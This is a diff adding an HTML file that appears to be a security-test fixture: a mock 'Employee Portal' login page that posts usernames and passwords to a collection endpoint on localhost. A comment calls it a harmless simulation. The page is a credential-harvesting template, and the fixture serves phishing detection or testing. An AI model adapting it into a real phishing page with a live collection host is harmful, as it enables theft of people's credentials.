@@ -1,0 +1,17 @@
+<!doctype html>
+<!-- Harmless simulation: a login form posting to a different (dummy) host. Use fake credentials only. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Employee Portal</title>
+</head>
+<body style="font-family: sans-serif; max-width: 380px; margin: 60px auto;">
+  <h1>Employee Portal</h1>
+  <p>Please authenticate to access internal resources.</p>
+  <form action="http://127.0.0.1:9999/collect" method="post">
+    <p><label>Username<br><input type="text" name="username"></label></p>
+    <p><label>Password<br><input type="password" name="password"></label></p>
+    <p><button type="submit">Continue</button></p>
+  </form>
+</body>
+</html>
